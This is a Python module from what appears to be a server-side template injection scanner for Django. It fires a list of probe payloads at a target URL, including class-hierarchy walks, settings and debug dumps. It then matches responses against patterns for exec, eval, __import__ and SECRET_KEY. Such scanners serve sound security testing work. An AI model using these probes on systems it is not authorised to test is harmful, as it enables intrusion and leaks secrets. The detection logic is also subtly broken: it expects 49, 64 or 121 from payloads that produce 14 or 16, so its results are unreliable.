"""
Django template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the Django template engine, commonly used in Django web applications.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class DjangoEngine(BaseTemplateEngine):
    """
    Django template engine detector.
    
    Django templates use {{}} for variables and {% %} for tags.
    They have built-in security but can be vulnerable in certain contexts.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "django"
        self.description = "Django template engine (Python)"
        self.payloads = self._load_payloads()
        
        # Django-specific patterns
        self.detection_patterns = {
            'math_result': [r'\b49\b', r'\b64\b', r'\b121\b'],
            'object_disclosure': [r'django\.', r'<class.*?>', r'__class__', r'__subclasses__'],
            'method_execution': [r'__import__', r'exec\(', r'eval\(', r'open\('],
            'debug_info': [r'DEBUG.*?True', r'DATABASES', r'SECRET_KEY'],
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load Django-specific SSTI payloads."""
        payloads = []
        
        # Basic variable access (limited due to Django's security)
        basic_payloads = [
            "{{7|add:7}}", "{{8|add:8}}", "{{debug}}", "{{settings}}", "{{request}}", 
            "{{user}}", "{{perms}}", "{{messages}}", "{{block.super}}", "{{csrf_token}}",
        ]
        
        # Advanced object access (exploiting __class__ etc.)
        advanced_payloads = [
            "{{''.__class__}}", "{{''.__class__.__mro__}}", "{{''.__class__.__subclasses__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}", 
            "{{request.__class__}}", "{{request.__class__.__mro__}}",
        ]
        
        # Template tags and filters
        tag_payloads = [
            "{% debug %}", "{% load admin_urls %}", "{% load static %}",
            "{{''|add:'TESTSTRING'}}", "{{7|add:'7'}}", "{{''|length}}",
        ]
        
        # URL-encoded variants  
        url_payloads = ["%7B%7B7%7Cadd%3A7%7D%7D", "%7B%7Bdebug%7D%7D"]
        
        all_payload_strings = basic_payloads + advanced_payloads + tag_payloads + url_payloads
        
        for payload_str in all_payload_strings:
            context = "url" if payload_str.startswith('%') else "html"
            if "add:" in payload_str or "|" in payload_str:
                payload_type = "filter"
            elif "{% " in payload_str:
                payload_type = "tag"
            elif "__class__" in payload_str:
                payload_type = "object_access"
            else:
                payload_type = "variable_access"
            
            payloads.append(Payload(
                payload=payload_str,
                type=payload_type,
                context=context,
                description=f"Django {payload_type} payload"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """Test payload against target URL."""
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(False, ConfidenceLevel.LOW, payload, "", "No HTTP client", self.name)
        
        try:
            if method.upper() == 'GET':
                test_url = f"{url}?test={payload}" if '?' not in url else url.replace('INJECT', payload)
                response = await http_client.get(test_url, headers=headers)
            else:
                test_data = data.copy() if data else {}
                test_data['test'] = payload
                response = await http_client.post(url, data=test_data, headers=headers)
            
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(False, ConfidenceLevel.LOW, payload, "", f"Request failed: {e}", self.name)
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """Analyze response for Django SSTI indicators."""
        if not response:
            return EngineResult(False, ConfidenceLevel.LOW, payload, response, "Empty response", self.name)
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Check for math results (add filter)
        if "add:" in payload:
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Math operation executed: {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
        
        # Check for object disclosure
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Object disclosure: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Check for Django-specific content
        django_indicators = ['DEBUG = True', 'DATABASES', 'SECRET_KEY', 'django.', 'CSRF', 'csrfmiddlewaretoken']
        for indicator in django_indicators:
            if indicator in response:
                evidence_parts.append(f"Django content exposed: {indicator}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Django template errors
        django_errors = ['TemplateSyntaxError', 'VariableDoesNotExist', 'TemplateDoesNotExist', 'Invalid filter', 'Invalid tag']
        for error in django_errors:
            if error in response:
                evidence_parts.append(f"Django template error: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Check for debug output
        if "debug" in payload.lower() and any(x in response for x in ['DEBUG', 'INSTALLED_APPS', 'MIDDLEWARE']):
            evidence_parts.append("Django debug information disclosed")
            confidence = max(confidence, ConfidenceLevel.HIGH)
            is_vulnerable = True
        
        evidence = "Django SSTI detected: " + "; ".join(evidence_parts) if evidence_parts else "No Django SSTI indicators"
        return EngineResult(is_vulnerable, confidence, payload, response[:500], evidence, self.name)
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        return payload
    
    def get_info(self) -> Dict[str, Any]:
        return {
            'name': self.name, 'description': self.description, 'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Django', 'language': 'Python', 'syntax': '{{variable}} and {% tag %}'
        }
